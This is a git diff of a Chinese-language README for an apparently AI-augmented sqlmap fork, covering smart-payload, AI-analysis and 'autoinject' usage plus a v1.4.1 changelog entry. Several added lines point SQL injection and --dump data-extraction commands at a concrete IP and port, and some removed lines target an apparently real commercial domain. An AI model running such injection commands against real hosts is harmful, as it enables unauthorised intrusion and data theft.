@@ -94,25 +94,25 @@ openai_auth_prefix = Bearer
 2. **智能注入测试**
    ```bash
    # 基本用法
-   python sqlmap.py -u "http://example.com/vuln.php?id=1" --smart-payload
+   python sqlmap.py -u "http://124.70.71.251:48385/new_list.php?id=1" --smart-payload
    
    # 指定数据库类型
    python sqlmap.py -u "http://example.com/vuln.php?id=1" --smart-payload --dbms=mysql
    
    # 结合其他SQLMap选项
-   python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --smart-payload --risk=3 --level=5
+   python sqlmap.py -u "http://example.com/vuln.php?id=1" --smart-payload --risk=3 --level=5
    ```
 
 3. **扫描结果分析**
    ```bash
    # 实时分析
-   python sqlmap.py -u "http://example.com/vuln.php?id=1" --ai-analysis
+   python sqlmap.py -u "http://124.70.71.251:48385/new_list.php?id=1" --ai-analysis
    
    # 分析并解释漏洞
-   python sqlmap.py -u "http://example.com/vuln.php?id=1" --ai-analysis --explain-vuln
+   python sqlmap.py -u "http://124.70.71.251:48385/new_list.php?id=1" --ai-analysis --explain-vuln
    
    # 完整分析（包含修复建议）
-   python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --ai-analysis --explain-vuln --suggest-fix
+   python sqlmap.py -u "http://example.com/vuln.php?id=1" --ai-analysis --explain-vuln --suggest-fix
    ```
 
 4. **批量测试**
@@ -127,13 +127,13 @@ openai_auth_prefix = Bearer
 5. **简化版自动注入** *(新功能)*
    ```bash
    # 基本用法
-   python -m ai_module autoinject "http://example.com/vuln.php?id=1"
+   python -m ai_module autoinject "http://124.70.71.251:48385/new_list.php?id=1"
    
    # 指定数据库类型
-   python -m ai_module autoinject "http://example.com/vuln.php?id=1" --dbms mysql
+   python -m ai_module autoinject "http://124.70.71.251:48385/new_list.php?id=1" --dbms mysql
    
    # 提取数据
-   python -m ai_module autoinject "http://example.com/vuln.php?id=1" --dump
+   python -m ai_module autoinject "http://124.70.71.251:48385/new_list.php?id=1" --dump
    ```
 
 ### AI CLI模式详解
@@ -553,11 +553,14 @@ language = zh_CN
 - 增强注入结果分析能力
 - 优化交互式CLI界面
 
-### v1.4.0 (最新版本)
+### v1.4.0 
 - 添加简化版自动注入功能，提高稳定性
 - 修复参数处理问题
 - 优化错误处理和调试信息
 - 添加更多使用案例和故障排除指南
+
+### v1.4.1 (最新版本)
+- 修复了一些BUG
 
 ## 贡献与反馈
 
